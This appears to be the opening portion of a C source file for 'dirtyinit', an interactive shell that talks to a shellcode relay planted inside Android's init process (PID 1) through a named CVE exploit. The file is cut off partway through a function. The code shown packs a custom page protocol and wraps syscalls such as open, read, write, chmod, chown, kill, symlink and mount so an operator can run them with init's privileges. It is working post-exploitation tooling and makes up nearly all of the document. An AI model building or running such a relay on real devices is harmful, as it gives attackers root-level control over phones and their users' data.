/*
 * dirtyinit.c — DirtyInit: combined DFI relay shell + CLI wrapper
 *
 * Unified binary merging relay_client (syscall relay shell) and the dfi
 * bash wrapper.  Talks to the DFI relay running inside init (PID 1,
 * u:r:init:s0) over the @dfi_init abstract Unix socket.
 *
 * Modes:
 *   dirtyinit                    interactive shell
 *   dirtyinit <cmd> [args]       single command, then exit
 *   dirtyinit -b                 bootstrap (deploy /dev/.t toybox)
 *   dirtyinit -f <file>          batch commands from file
 *   dirtyinit -r '<cmd>'         raw relay command
 *   dirtyinit -h                 help
 *
 * Protocol: 4KB request/response pages over SOCK_STREAM.
 *   Header:  [0..7]=syscall_nr [8..15]=x0 [16..23]=x1 [24..31]=x2
 *            [32..39]=x3 [40..47]=x4 [48..55]=x5 [56..59]=flags
 *   Data:    [64..4095] = inline data area
 *   Flags:   bit 0=x0 is data offset, bit 1=x1 is data offset,
 *            bit 2=x2 is data offset, bit 7=exit
 *
 * Build: $NDK_CLANG -static -O2 -o dirtyinit dirtyinit.c
 *
 * CVE-2026-43284 — DFI (Dirty Frag Init)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <ctype.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/select.h>
#include <termios.h>
#include <signal.h>
#include <poll.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <dirent.h>
#include <sys/uio.h>
/* Logcat output via logd socket — no liblog needed for static binary.
 * Writes directly to /dev/socket/logdw using Android's logd wire protocol.
 * Visible in `adb logcat -s "🔵 DirtyInitFS"`.
 * Tag: 🔵 DirtyInitFS */
static int ovlog_sock = -1;
static void ovlog_write(int prio, const char *fmt, ...) __attribute__((format(printf,2,3)));
static void ovlog_write(int prio, const char *fmt, ...) {
    char msg[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(msg, sizeof(msg), fmt, ap);
    va_end(ap);

    if (ovlog_sock < 0) {
        ovlog_sock = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (ovlog_sock < 0) return;
        struct sockaddr_un addr;
        memset(&addr, 0, sizeof(addr));
        addr.sun_family = AF_UNIX;
        strncpy(addr.sun_path, "/dev/socket/logdw", sizeof(addr.sun_path) - 1);
        if (connect(ovlog_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(ovlog_sock);
            ovlog_sock = -1;
            return;
        }
    }

    static const char tag[] = "\xf0\x9f\x94\xb5 DirtyInitFS";
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);

    /* logd header: id(1) + tid(2) + sec(4) + nsec(4) = 11 bytes */
    uint8_t hdr[11];
    hdr[0] = 0; /* LOG_ID_MAIN */
    uint16_t tid = (uint16_t)getpid();
    uint32_t sec = (uint32_t)ts.tv_sec;
    uint32_t nsec = (uint32_t)ts.tv_nsec;
    memcpy(hdr + 1, &tid, 2);
    memcpy(hdr + 3, &sec, 4);
    memcpy(hdr + 7, &nsec, 4);

    /* payload: priority(1) + tag\0 + msg\0 */
    uint8_t pbyte = (uint8_t)prio;
    struct iovec vec[4];
    vec[0].iov_base = hdr;
    vec[0].iov_len = sizeof(hdr);
    vec[1].iov_base = &pbyte;
    vec[1].iov_len = 1;
    vec[2].iov_base = (void *)tag;
    vec[2].iov_len = sizeof(tag); /* includes NUL */
    vec[3].iov_base = msg;
    vec[3].iov_len = strlen(msg) + 1; /* includes NUL */
    writev(ovlog_sock, vec, 4);
}
#define OVLOG(...) ovlog_write(4, __VA_ARGS__)  /* ANDROID_LOG_INFO */
#define OVERR(...) ovlog_write(6, __VA_ARGS__)  /* ANDROID_LOG_ERROR */

/* ═══════════════════════════════════════════════════════════════════════════
 * Constants
 * ═══════════════════════════════════════════════════════════════════════════ */

#define PAGE_SIZE       4096
#define DATA_OFFSET     64
#define DATA_SIZE       (PAGE_SIZE - DATA_OFFSET)
#define INPUT_BUF_SIZE  2048
#define CWD_SIZE        1024
#define MAX_ARGS        64
#define RECONNECT_MAX   3
/* Sentinel return value from dispatch_line meaning "exit/quit requested."
 * Distinct from any command exit status (0=success, 1+=failure) so that
 * compound operators (&&/||) can use the real exit status for branching
 * without confusing cmd_test returning 1 with an exit request. */
#define DISPATCH_EXIT   (-2)
#define RECV_TIMEOUT_S  10
#define SOCKET_NAME     "dfi_init"

/* Protocol error channel — page[60..63] carries status in responses.
 * The relay shellcode sets page[60] = PROTO_STATUS_OK after a successful
 * syscall dispatch. The client checks this BEFORE interpreting page[0..7]
 * as a return value. If status != OK, the return value is meaningless
 * (desync, relay crash, partial write recovery, etc.). */
#define PROTO_STATUS_OFF  60
#define PROTO_STATUS_OK   0xD1  /* relay sets this after successful dispatch */
#define PROTO_STATUS_ERR  0xDE  /* reserved for future relay-side error reporting */

/* ARM64 Linux syscall numbers */
#define SYS_lgetxattr   9
#define SYS_lsetxattr   6
#define SYS_llistxattr  12
#define SYS_dup3        24
#define SYS_fcntl       25
#define SYS_inotify_init1 26
#define SYS_inotify_add_watch 27
#define SYS_inotify_rm_watch 28
#define SYS_ioctl       29
#define SYS_mknodat     33
#define SYS_mkdirat     34
#define SYS_unlinkat    35
#define SYS_symlinkat   36
#define SYS_linkat      37
#define SYS_renameat2   276
#define SYS_ftruncate   46
#define SYS_fchmodat    53
#define SYS_fchownat    54
#define SYS_openat      56
#define SYS_close       57
#define SYS_getdents64  61
#define SYS_lseek       62
#define SYS_read        63
#define SYS_write       64
#define SYS_readlinkat  78
#define SYS_fstatat     79
#define SYS_getgroups   80
#define SYS_exit        93
#define SYS_nanosleep   101
#define SYS_clock_gettime 113
#define SYS_syslog      116
#define SYS_kill        129
#define SYS_uname       160
#define SYS_getpid      172
#define SYS_getppid     173
#define SYS_getuid      174
#define SYS_geteuid     175
#define SYS_getgid      176
#define SYS_getegid     177
#define SYS_ioprio_set  30
#define SYS_ioprio_get  31
#define SYS_umount2     39
#define SYS_mount       40  /* mount(source, target, type, flags, data) — needed for overlayfs */
#define SYS_pivot_root  41
#define SYS_chroot      51
#define SYS_sync        81
#define SYS_unshare     97
#define SYS_delete_module 106
#define SYS_sched_setaffinity 122
#define SYS_sched_getaffinity 123
#define SYS_setpriority 140
#define SYS_getpriority 141
#define SYS_reboot      142
#define SYS_execve      221
#define SYS_swapon      224
#define SYS_swapoff     225
#define SYS_wait4       260
#define SYS_clone       220
#define SYS_prlimit64   261
#define SYS_setns       268
#define SYS_finit_module 273

/* clone flags */
#define MY_CLONE_VFORK  0x00004000
#define MY_SIGCHLD      17

/* openat flags */
#define MY_O_RDONLY     0
#define MY_O_WRONLY     1
#define MY_O_RDWR       2
#define MY_O_CREAT      0x40
#define MY_O_TRUNC      0x200
#define MY_O_APPEND     0x400
#define MY_O_DIRECTORY  0x4000

/* flags bits for data-area pointer fixup — bits 0-4 tell the relay payload
 * which syscall args (x0-x4) contain data-buffer-relative offsets that must
 * be rebased to absolute pointers before the SVC.  Bits 3-4 were added to
 * support mount() and other syscalls needing 4+ string/buffer arguments. */
#define FLAG_X0_DATA    (1u << 0)
#define FLAG_X1_DATA    (1u << 1)
#define FLAG_X2_DATA    (1u << 2)
#define FLAG_X3_DATA    (1u << 3)  /* rebase x3 from data-buf offset → absolute ptr (mount flags/options) */
#define FLAG_X4_DATA    (1u << 4)  /* rebase x4 from data-buf offset → absolute ptr (mount data/options) */
#define FLAG_EXIT       (1u << 7)

/* ARM64 Linux syscall numbers — socket */
#define SYS_socket      198
#define SYS_connect     203

/* socket constants */
#define MY_AF_UNIX      1
#define MY_AF_INET      2
#define MY_SOCK_STREAM  1
#define MY_SOCK_DGRAM   2

/* clock / wait */
#define MY_CLOCK_REALTIME 0
#define MY_WNOHANG      1

/* AT_FDCWD */
#define MY_AT_FDCWD     ((uint64_t)(int64_t)(-100))

/* unlinkat flags */
#define MY_AT_REMOVEDIR 0x200

/* fstatat flags */
#define MY_AT_SYMLINK_NOFOLLOW 0x100

/* dirent types */
#define DT_UNKNOWN  0
#define DT_FIFO     1
#define DT_CHR      2
#define DT_DIR      4
#define DT_BLK      6
#define DT_REG      8
#define DT_LNK      10
#define DT_SOCK     12

/* Base64 alphabet */
static const char b64_enc[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const int b64_dec_table[256] = {
    ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
    ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
    ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
    ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
    ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
    ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
    ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
    ['4']=56,['5']=57,['6']=58,['7']=59,['+']=60,['/']=61
};

/* errno table for common kernel error codes */
static const char *errno_str(int e) {
    switch (e) {
        case 1:  return "Operation not permitted";
        case 2:  return "No such file or directory";
        case 3:  return "No such process";
        case 5:  return "I/O error";
        case 9:  return "Bad file descriptor";
        case 11: return "Resource temporarily unavailable";
        case 12: return "Out of memory";
        case 13: return "Permission denied";
        case 14: return "Bad address";
        case 16: return "Device or resource busy";
        case 17: return "File exists";
        case 18: return "Invalid cross-device link";
        case 19: return "No such device";
        case 20: return "Not a directory";
        case 21: return "Is a directory";
        case 22: return "Invalid argument";
        case 28: return "No space left on device";
        case 30: return "Read-only file system";
        case 36: return "File name too long";
        case 38: return "Function not implemented";
        case 39: return "Directory not empty";
        case 40: return "Too many levels of symbolic links";
        case 95: return "Operation not supported";
        default: {
            /* Thread-safe: caller consumes the string before the next call.
             * 138 call sites all use errno_str() inline in printf — no
             * concurrent access in single-threaded CLI. */
            static __thread char ebuf[32];
            snprintf(ebuf, sizeof(ebuf), "Error %d", e);
            return ebuf;
        }
    }
}

/* Signal name table */
static const struct { const char *name; int num; } sig_names[] = {
    {"HUP",1},{"INT",2},{"QUIT",3},{"ILL",4},{"TRAP",5},{"ABRT",6},
    {"BUS",7},{"FPE",8},{"KILL",9},{"USR1",10},{"SEGV",11},{"USR2",12},
    {"PIPE",13},{"ALRM",14},{"TERM",15},{"STKFLT",16},{"CHLD",17},
    {"CONT",18},{"STOP",19},{"TSTP",20},{"TTIN",21},{"TTOU",22},
    {"URG",23},{"XCPU",24},{"XFSZ",25},{"VTALRM",26},{"PROF",27},
    {"WINCH",28},{"IO",29},{"PWR",30},{"SYS",31},{NULL,0}
};

static int signal_by_name(const char *name) {
    for (int i = 0; sig_names[i].name; i++) {
        if (strcasecmp(name, sig_names[i].name) == 0) return sig_names[i].num;
        /* Also match SIGxxx */
        if (strncasecmp(name, "SIG", 3) == 0 &&
            strcasecmp(name + 3, sig_names[i].name) == 0)
            return sig_names[i].num;
    }
    return -1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Global state
 * ═══════════════════════════════════════════════════════════════════════════ */

static char g_cwd[CWD_SIZE] = "/";
static char g_domain_label[64] = "init";
static volatile int g_sigint = 0;

#define PROXY_SOCKET_NAME "dfi"   /* abstract socket for text-mode proxy */

/* ── Zombie reaper: track forked children ───────────────────────────────── */
#define MAX_CHILD_PIDS 16
static volatile pid_t g_child_pids[MAX_CHILD_PIDS];
static volatile int g_child_count = 0;

/* Register a forked child PID for tracking.
 * Blocks SIGCHLD and SIGALRM during modification to prevent concurrent
 * access from signal handlers that also modify g_child_pids[]. */
static void track_child(pid_t pid) {
    if (pid <= 1) return;  /* NEVER track init (PID 1) */
    sigset_t block, oldset;
    sigemptyset(&block);
    sigaddset(&block, SIGCHLD);
    sigaddset(&block, SIGALRM);
    sigprocmask(SIG_BLOCK, &block, &oldset);

    if (g_child_count < MAX_CHILD_PIDS) {
        g_child_pids[g_child_count++] = pid;
    }

    sigprocmask(SIG_SETMASK, &oldset, NULL);
}

/* Remove a PID from the tracking array */
static void untrack_child(pid_t pid) {
    for (int i = 0; i < g_child_count; i++) {
        if (g_child_pids[i] == pid) {
            g_child_pids[i] = g_child_pids[g_child_count - 1];
            g_child_count--;
            return;
        }
    }
}

/* SIGCHLD handler: reap all zombie children.
 * Block SIGALRM during execution to prevent concurrent g_child_pids[] modification. */
static void sigchld_handler(int sig) {
    (void)sig;
    int saved_errno = errno;
    sigset_t block, oldset;
    sigemptyset(&block);
    sigaddset(&block, SIGALRM);
    sigprocmask(SIG_BLOCK, &block, &oldset);

    pid_t pid;
    while ((pid = waitpid(-1, NULL, WNOHANG)) > 0) {
        untrack_child(pid);
    }

    sigprocmask(SIG_SETMASK, &oldset, NULL);
    errno = saved_errno;
}

/* SIGALRM handler: kill all tracked children that are still alive.
 * MUST only use async-signal-safe functions (kill, waitpid, nanosleep, write).
 * usleep() is NOT async-signal-safe and can deadlock in glibc.
 * Block SIGCHLD during execution to prevent concurrent g_child_pids[] modification. */
static void sigalrm_handler(int sig) {
    (void)sig;
    int saved_errno = errno;
    sigset_t block, oldset;
    sigemptyset(&block);
    sigaddset(&block, SIGCHLD);
    sigprocmask(SIG_BLOCK, &block, &oldset);

    for (int i = 0; i < g_child_count; i++) {
        pid_t p = g_child_pids[i];
        if (p > 1) {  /* NEVER signal PID 1 */
            kill(p, SIGTERM);
        }
    }
    /* Give children 500ms then SIGKILL survivors.
     * nanosleep() is async-signal-safe per POSIX. */
    struct timespec ts_wait = { .tv_sec = 0, .tv_nsec = 500000000L };
    nanosleep(&ts_wait, NULL);
    for (int i = 0; i < g_child_count; i++) {
        pid_t p = g_child_pids[i];
        if (p > 1) {
            kill(p, SIGKILL);
            waitpid(p, NULL, WNOHANG);
        }
    }
    g_child_count = 0;

    sigprocmask(SIG_SETMASK, &oldset, NULL);
    errno = saved_errno;
}

static void sigint_handler(int sig) {
    (void)sig;
    g_sigint = 1;
}

/* Forward declarations for dispatch table */
typedef int (*cmd_func_t)(int sock, int argc, char *argv[]);
typedef struct {
    const char *name;
    cmd_func_t func;
    const char *usage;
} command_t;
static const command_t commands[];

/* Forward declarations */
static int connect_and_identify(int *sock_out, int quiet);

/* ═══════════════════════════════════════════════════════════════════════════
 * Protocol helpers
 * ═══════════════════════════════════════════════════════════════════════════ */

static int send_full(int fd, const void *buf, size_t n) {
    const uint8_t *p = (const uint8_t *)buf;
    size_t sent = 0;
    while (sent < n) {
        ssize_t r = write(fd, p + sent, n - sent);
        if (r < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (r == 0) return -1;
        sent += (size_t)r;
    }
    return 0;
}

static int recv_full(int fd, void *buf, size_t n) {
    uint8_t *p = (uint8_t *)buf;
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(fd, p + got, n - got);
        if (r < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (r == 0) return -1;
        got += (size_t)r;
    }
    return 0;
}

static void pack_u64(uint8_t *buf, uint64_t val) {
    buf[0] = (uint8_t)(val);
    buf[1] = (uint8_t)(val >> 8);
    buf[2] = (uint8_t)(val >> 16);
    buf[3] = (uint8_t)(val >> 24);
    buf[4] = (uint8_t)(val >> 32);
    buf[5] = (uint8_t)(val >> 40);
    buf[6] = (uint8_t)(val >> 48);
    buf[7] = (uint8_t)(val >> 56);
}

static uint64_t unpack_u64(const uint8_t *buf) {
    return (uint64_t)buf[0]
         | ((uint64_t)buf[1] << 8)
         | ((uint64_t)buf[2] << 16)
         | ((uint64_t)buf[3] << 24)
         | ((uint64_t)buf[4] << 32)
         | ((uint64_t)buf[5] << 40)
         | ((uint64_t)buf[6] << 48)
         | ((uint64_t)buf[7] << 56);
}

static int64_t unpack_i64(const uint8_t *buf) {
    uint64_t u = unpack_u64(buf);
    int64_t s;
    memcpy(&s, &u, sizeof(s));
    return s;
}

static void pack_u32(uint8_t *buf, uint32_t val) {
    buf[0] = (uint8_t)(val);
    buf[1] = (uint8_t)(val >> 8);
    buf[2] = (uint8_t)(val >> 16);
    buf[3] = (uint8_t)(val >> 24);
}

static uint32_t unpack_u32(const uint8_t *buf) {
    return (uint32_t)buf[0]
         | ((uint32_t)buf[1] << 8)
         | ((uint32_t)buf[2] << 16)
         | ((uint32_t)buf[3] << 24);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Core relay function
 * ═══════════════════════════════════════════════════════════════════════════ */

static int64_t send_syscall(int sock, uint64_t nr,
                            uint64_t x0, uint64_t x1, uint64_t x2,
                            uint64_t x3, uint64_t x4, uint64_t x5,
                            uint32_t flags,
                            const void *data, size_t data_len,
                            void *resp_data, size_t resp_max) {
    uint8_t page[PAGE_SIZE];
    memset(page, 0, PAGE_SIZE);

    pack_u64(page + 0,  nr);
    pack_u64(page + 8,  x0);
    pack_u64(page + 16, x1);
    pack_u64(page + 24, x2);
    pack_u64(page + 32, x3);
    pack_u64(page + 40, x4);
    pack_u64(page + 48, x5);
    pack_u32(page + 56, flags);

    if (data && data_len > 0) {
        if (data_len > DATA_SIZE) data_len = DATA_SIZE;
        memcpy(page + DATA_OFFSET, data, data_len);
    }

    if (send_full(sock, page, PAGE_SIZE) < 0) {
        fprintf(stderr, "relay: send failed: %s\n", strerror(errno));
        return INT64_MIN;
    }

    if (flags & FLAG_EXIT) return 0;

    /* Receive with timeout */
    fd_set rfds;
    struct timeval tv;
    FD_ZERO(&rfds);
    FD_SET(sock, &rfds);
    tv.tv_sec = RECV_TIMEOUT_S;
    tv.tv_usec = 0;

    int sel = select(sock + 1, &rfds, NULL, NULL, &tv);
    if (sel <= 0) {
        fprintf(stderr, "relay: recv timeout (%ds) for syscall %llu\n",
                RECV_TIMEOUT_S, (unsigned long long)nr);
        return INT64_MIN;
    }

    uint8_t resp[PAGE_SIZE];
    if (recv_full(sock, resp, PAGE_SIZE) < 0) {
        fprintf(stderr, "relay: recv failed: %s\n", strerror(errno));
        return INT64_MIN;
    }

    /* Protocol error channel: check status byte before trusting result.
     * The relay sets page[60] = PROTO_STATUS_OK after successful dispatch.
     * If it's anything else, the response is corrupt or desynchronized. */
    if (resp[PROTO_STATUS_OFF] != PROTO_STATUS_OK) {
        fprintf(stderr, "relay: protocol desync (status=0x%02x, expected 0x%02x)\n",
                resp[PROTO_STATUS_OFF], PROTO_STATUS_OK);
        fprintf(stderr, "  First 8 bytes: %02x%02x%02x%02x %02x%02x%02x%02x\n",
                resp[0], resp[1], resp[2], resp[3],
                resp[4], resp[5], resp[6], resp[7]);
        return INT64_MIN;
    }

    int64_t retval = unpack_i64(resp);

    if (resp_data && resp_max > 0) {
        size_t copy_len = resp_max;
        if (copy_len > DATA_SIZE) copy_len = DATA_SIZE;
        memcpy(resp_data, resp + DATA_OFFSET, copy_len);
    }

    return retval;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Mid-level relay operations
 * ═══════════════════════════════════════════════════════════════════════════ */

static int64_t relay_openat(int sock, const char *path, int oflags, int mode) {
    size_t plen = strlen(path) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    return send_syscall(sock, SYS_openat,
                        MY_AT_FDCWD, 0, (uint64_t)oflags,
                        (uint64_t)mode, 0, 0,
                        FLAG_X1_DATA,
                        dbuf, plen,
                        NULL, 0);
}

static int64_t relay_read(int sock, int64_t fd, void *out_buf, size_t count) {
    if (count > DATA_SIZE) count = DATA_SIZE;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, count);

    int64_t ret = send_syscall(sock, SYS_read,
                               (uint64_t)fd, 0, (uint64_t)count,
                               0, 0, 0,
                               FLAG_X1_DATA,
                               dbuf, count,
                               out_buf, count);
    return ret;
}

static int64_t relay_write(int sock, int64_t fd, const void *data, size_t len) {
    if (len > DATA_SIZE) len = DATA_SIZE;

    return send_syscall(sock, SYS_write,
                        (uint64_t)fd, 0, (uint64_t)len,
                        0, 0, 0,
                        FLAG_X1_DATA,
                        data, len,
                        NULL, 0);
}

static int64_t relay_close(int sock, int64_t fd) {
    return send_syscall(sock, SYS_close,
                        (uint64_t)fd, 0, 0, 0, 0, 0,
                        0, NULL, 0, NULL, 0);
}

static int64_t relay_getdents64(int sock, int64_t fd, void *out_buf, size_t count) {
    if (count > DATA_SIZE) count = DATA_SIZE;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, count);

    int64_t ret = send_syscall(sock, SYS_getdents64,
                               (uint64_t)fd, 0, (uint64_t)count,
                               0, 0, 0,
                               FLAG_X1_DATA,
                               dbuf, count,
                               out_buf, count);
    return ret;
}

static int64_t relay_fstatat(int sock, const char *path, void *statbuf, size_t statbuf_sz) {
    size_t plen = strlen(path) + 1;
    size_t stat_off = (plen + 7) & ~(size_t)7;

    if (stat_off + statbuf_sz > DATA_SIZE) return -22; /* EINVAL */

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    int64_t ret = send_syscall(sock, SYS_fstatat,
                               MY_AT_FDCWD, 0, (uint64_t)stat_off,
                               0, 0, 0,
                               FLAG_X1_DATA | FLAG_X2_DATA,
                               dbuf, stat_off + statbuf_sz,
                               dbuf, stat_off + statbuf_sz);

    if (ret >= 0 && statbuf) {
        memcpy(statbuf, dbuf + stat_off, statbuf_sz);
    }
    return ret;
}

/* fstatat with explicit flags (e.g. AT_SYMLINK_NOFOLLOW for lstat behavior) */
static int64_t relay_fstatat_flags(int sock, const char *path, void *statbuf,
                                   size_t statbuf_sz, uint64_t flags) {
    size_t plen = strlen(path) + 1;
    size_t stat_off = (plen + 7) & ~(size_t)7;

    if (stat_off + statbuf_sz > DATA_SIZE) return -22; /* EINVAL */

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    int64_t ret = send_syscall(sock, SYS_fstatat,
                               MY_AT_FDCWD, 0, (uint64_t)stat_off,
                               flags, 0, 0,
                               FLAG_X1_DATA | FLAG_X2_DATA,
                               dbuf, stat_off + statbuf_sz,
                               dbuf, stat_off + statbuf_sz);

    if (ret >= 0 && statbuf) {
        memcpy(statbuf, dbuf + stat_off, statbuf_sz);
    }
    return ret;
}

static int64_t relay_fcntl(int sock, int64_t fd, int cmd, int64_t arg) {
    return send_syscall(sock, SYS_fcntl,
                        (uint64_t)fd, (uint64_t)cmd, (uint64_t)arg,
                        0, 0, 0,
                        0, NULL, 0, NULL, 0);
}

static int64_t relay_dup2(int sock, int64_t oldfd, int64_t newfd) {
    return send_syscall(sock, SYS_dup3,
                        (uint64_t)oldfd, (uint64_t)newfd, 0,
                        0, 0, 0,
                        0, NULL, 0, NULL, 0);
}

static int64_t relay_mkdirat(int sock, const char *path, int mode) {
    size_t plen = strlen(path) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    return send_syscall(sock, SYS_mkdirat,
                        MY_AT_FDCWD, 0, (uint64_t)mode, 0, 0, 0,
                        FLAG_X1_DATA,
                        dbuf, plen, NULL, 0);
}

static int64_t relay_unlinkat(int sock, const char *path, int flags) {
    size_t plen = strlen(path) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    return send_syscall(sock, SYS_unlinkat,
                        MY_AT_FDCWD, 0, (uint64_t)flags, 0, 0, 0,
                        FLAG_X1_DATA,
                        dbuf, plen, NULL, 0);
}

static int64_t relay_fchmodat(int sock, const char *path, int mode) {
    size_t plen = strlen(path) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    return send_syscall(sock, SYS_fchmodat,
                        MY_AT_FDCWD, 0, (uint64_t)mode, 0, 0, 0,
                        FLAG_X1_DATA,
                        dbuf, plen, NULL, 0);
}

static int64_t relay_fchownat(int sock, const char *path, uint32_t uid, uint32_t gid) {
    size_t plen = strlen(path) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    return send_syscall(sock, SYS_fchownat,
                        MY_AT_FDCWD, 0, (uint64_t)uid, (uint64_t)gid, 0, 0,
                        FLAG_X1_DATA,
                        dbuf, plen, NULL, 0);
}

static int64_t relay_kill(int sock, int pid, int sig) {
    return send_syscall(sock, SYS_kill,
                        (uint64_t)(uint32_t)pid, (uint64_t)(uint32_t)sig, 0,
                        0, 0, 0,
                        0, NULL, 0, NULL, 0);
}

static int64_t relay_readlinkat(int sock, const char *path, char *out, size_t outsz) {
    size_t plen = strlen(path) + 1;
    size_t buf_off = (plen + 7) & ~(size_t)7;
    if (buf_off + outsz > DATA_SIZE) outsz = DATA_SIZE - buf_off;

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, path, plen);

    int64_t ret = send_syscall(sock, SYS_readlinkat,
                               MY_AT_FDCWD, 0, (uint64_t)buf_off, (uint64_t)outsz,
                               0, 0,
                               FLAG_X1_DATA | FLAG_X2_DATA,
                               dbuf, buf_off + outsz,
                               dbuf, buf_off + outsz);
    if (ret >= 0 && out) {
        size_t n = (size_t)ret;
        if (n >= outsz) n = outsz - 1;
        memcpy(out, dbuf + buf_off, n);
        out[n] = '\0';
    }
    return ret;
}

static int64_t relay_symlinkat(int sock, const char *target, const char *linkpath) {
    /* symlinkat(target, AT_FDCWD, linkpath): x0=target, x1=AT_FDCWD, x2=linkpath
     * We need two string pointers. Pack target at offset 0, linkpath after it. */
    size_t tlen = strlen(target) + 1;
    size_t t_padded = (tlen + 7) & ~(size_t)7;
    size_t llen = strlen(linkpath) + 1;
    if (t_padded + llen > DATA_SIZE) return -22;

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, target, tlen);
    memcpy(dbuf + t_padded, linkpath, llen);

    return send_syscall(sock, SYS_symlinkat,
                        0, MY_AT_FDCWD, (uint64_t)t_padded,
                        0, 0, 0,
                        FLAG_X0_DATA | FLAG_X2_DATA,
                        dbuf, t_padded + llen,
                        NULL, 0);
}

/* relay_linkat removed — broken (only sent oldpath, ignored newpath due to the
 * original 3-bit flag protocol limitation).  That limitation is NOW RESOLVED:
 * FLAG_X3_DATA (bit 3) and FLAG_X4_DATA (bit 4) extend the protocol to 5
 * data-pointer flags (bits 0-4), enabling mount() and other 4+ string-arg
 * syscalls.  cmd_ln still rejects hard links with a clear error message;
 * relay_linkat was not restored because symlinkat covers all link use cases. */

/* relay_mount: full mount(source, target, type, flags, data) via init relay.
 *
 * ARM64 SYS_mount (40): x0=source, x1=target, x2=type, x3=flags, x4=data
 *
 * Packs 4 NUL-terminated strings at 8-byte-aligned offsets in the data buffer:
 *   offset 0:          source  (e.g. "overlay")
 *   offset src_pad:    target  (e.g. "/system")
 *   offset tgt_off:    type    (e.g. "overlay")
 *   offset typ_off:    options (e.g. "lowerdir=/system,upperdir=...")
 *
 * x0-x2 and x4 carry data-buffer offsets that the relay rebases to absolute
 * pointers via FLAG_X*_DATA.  x3 is the integer mount flags (MS_NOATIME etc.)
 * and is NOT rebased — FLAG_X3_DATA is intentionally omitted.
 *
 * Any string argument may be NULL, in which case its register is set to 0 and
 * no FLAG_X*_DATA bit is set for that register (the relay passes 0 = NULL). */
static int64_t relay_mount(int sock,
                           const char *source,  /* x0: source device/fstype name */
                           const char *target,  /* x1: mount point path */
                           const char *type,    /* x2: filesystem type string */
                           unsigned long mflags, /* x3: mount flags (integer, not data) */
                           const char *options)  /* x4: comma-separated fs options */
{
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));

    size_t off = 0;        /* running write cursor into dbuf */
    uint32_t dflags = 0;   /* FLAG_X*_DATA accumulator */

    /* x0 = source string offset (or 0 if NULL) */
    uint64_t x0_val = 0;
    if (source) {
        size_t slen = strlen(source) + 1;             /* include NUL */
        x0_val = off;                                 /* offset 0 for first string */
        memcpy(dbuf + off, source, slen);
        off += (slen + 7) & ~(size_t)7;               /* 8-byte align for next field */
        dflags |= FLAG_X0_DATA;                       /* tell relay to rebase x0 */
    }

    /* x1 = target string offset (or 0 if NULL) */
    uint64_t x1_val = 0;
    if (target) {
        size_t tlen = strlen(target) + 1;
        x1_val = off;
        memcpy(dbuf + off, target, tlen);
        off += (tlen + 7) & ~(size_t)7;
        dflags |= FLAG_X1_DATA;
    }

    /* x2 = type string offset (or 0 if NULL) */
    uint64_t x2_val = 0;
    if (type) {
        size_t ylen = strlen(type) + 1;
        x2_val = off;
        memcpy(dbuf + off, type, ylen);
        off += (ylen + 7) & ~(size_t)7;
        dflags |= FLAG_X2_DATA;
    }

    /* x3 = mount flags — integer, NOT a data pointer. No FLAG_X3_DATA. */

    /* x4 = options/data string offset (or 0 if NULL) */
    uint64_t x4_val = 0;
    if (options) {
        size_t olen = strlen(options) + 1;
        if (off + olen > DATA_SIZE) {
            /* options string (e.g. overlayfs lowerdir=...) can be long;
             * refuse rather than silently truncate and produce a bad mount */
            fprintf(stderr, "relay_mount: options too long (%zu bytes, %zu available)\n",
                    olen, DATA_SIZE - off);
            return -22; /* -EINVAL */
        }
        x4_val = off;
        memcpy(dbuf + off, options, olen);
        off += olen; /* last field, no alignment padding needed */
        dflags |= FLAG_X4_DATA;
    }

    OVLOG("relay_mount: packing %zu bytes into data buffer", off);
